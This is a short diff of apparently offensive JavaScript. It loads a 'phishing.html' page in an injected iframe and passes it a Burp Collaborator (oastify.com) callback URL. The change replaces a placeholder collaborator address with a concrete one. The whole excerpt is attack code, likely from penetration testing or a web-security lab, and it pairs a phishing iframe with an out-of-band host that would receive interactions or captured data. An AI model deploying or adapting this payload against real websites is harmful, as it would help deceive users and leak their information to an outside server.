@@ -16,7 +16,7 @@
   })();
   var collab = typeof window.BURP_COLLAB === 'string' && window.BURP_COLLAB
     ? window.BURP_COLLAB
-    : 'https://YOUR-BURP-COLLAB.oastify.com'; // fallback if not set
+    : 'https://e6l7qy1188bnm40b0wlz9aeoofu9iz6o.oastify.com'; // fallback if not set
   var phishingUrl = base + 'phishing.html?collab=' + encodeURIComponent(collab);
   var iframe = document.createElement('iframe');
   iframe.src = phishingUrl;
